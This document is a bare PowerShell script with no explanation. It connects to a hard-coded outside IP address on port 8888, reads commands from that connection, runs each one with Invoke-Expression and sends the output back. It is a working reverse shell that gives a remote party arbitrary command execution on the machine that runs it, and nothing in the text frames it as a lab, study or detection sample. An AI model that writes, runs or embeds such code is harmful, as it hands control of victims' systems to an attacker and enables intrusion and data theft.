[System.Net.Sockets.TcpClient]$c = [System.Net.Sockets.TcpClient]::new("13.80.244.81", "8888");
$s = $c.GetStream();
[System.IO.StreamReader]$r = [System.IO.StreamReader]::new($s);
[System.IO.StreamWriter]$w = [System.IO.StreamWriter]::new($s);
while ($c.Connected) {
    while ($s.DataAvailable) {
        $cmd = $r.ReadLine();
        $o = (iex $cmd)2>&1| %{$w.WriteLine($_)};
        $w.Flush();
    }
}
